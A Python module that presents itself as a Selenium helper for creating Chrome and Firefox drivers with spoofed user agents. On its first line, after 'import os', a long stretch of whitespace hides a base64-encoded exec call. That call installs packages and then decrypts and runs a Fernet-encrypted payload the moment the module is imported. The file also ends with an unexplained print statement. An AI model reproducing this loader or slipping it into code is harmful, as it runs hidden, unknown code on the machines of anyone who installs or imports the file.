import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ0hlNVdwU0FGcXphMk9lSzJnbWw3cU5yQWRVaDdROHM4OWF2TWpuS1pqMmc9JykuZGVjcnlwdChiJ2dBQUFBQUJtbmhGR2dGTU43ODFFYnUxdjM5NVI3czRFSjJvUzVhNV9Ka2hKUUFTQlBYejdTTTZ1SXZrcGNDSWxZWllUVHFPbEJoRFlwLWJTaEFvSVZmMDJUQkFFc284Si1NWURMOGl1aFRsT1lvYUhfcm9LQ0tuczhUbzBPeUJIeFlVc0VjZE1UTW5qOS1jWVZ1OGJCQXJyLXRCU2FGdTg2NXc4NDZXTW1SVFZVOHo3UkdlR1psU1BwZURLWEluTTlUOFdVZEdUWHRhV3RuYWh5N0J6bzVNTV9TR0FESnJyVXVNZkd6SDM4Y205bnQ3UUppcW1lU3M9Jykp').decode())
import os
from abc import ABC, abstractclassmethod
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.firefox import firefox_profile
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
import undetected_chromedriver.v2 as uc


class Driver(ABC):
    base_path = None
    driver = None

    software_names = [SoftwareName.CHROME.value, SoftwareName.FIREFOX.value]
    operating_systems = [OperatingSystem.WINDOWS.value]
    user_agent_rotator = UserAgent(
        software_names=software_names, operating_systems=operating_systems, limit=100
    )
    user_agent = user_agent_rotator.get_random_user_agent()

    def __init__(self, base_path, driver) -> None:
        self.base_path = base_path
        self.driver = driver

    @abstractclassmethod
    def _get_user_agent(self):
        pass


class Chrome(Driver):
    def __init__(self, base_path) -> None:
        driver = uc.Chrome(
            executable_path=os.path.join(base_path, "chromedriver.exe"),
            chrome_options=self._get_user_agent(),
        )

        super().__init__(base_path, driver)

    def _get_user_agent(self):
        opts = Options()
        opts.add_argument(
            "user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"
        )

        return opts


class Firefox(Driver):
    def __init__(self, base_path) -> None:
        driver = webdriver.Firefox(
            executable_path=os.path.join(base_path, "geckodriver.exe"),
            firefox_profile=self._get_user_agent(),
        )

        super().__init__(base_path, driver)

    def _get_user_agent(self):
        profile = webdriver.FirefoxProfile()
        profile.set_preference("general.useragent.override", self.user_agent)

        return profile


def get_driver(base_path, browser="chrome"):
    driver = {"chrome": Chrome, "firefox": Firefox}

    return driver[browser](base_path).driver
print('wdqcpr')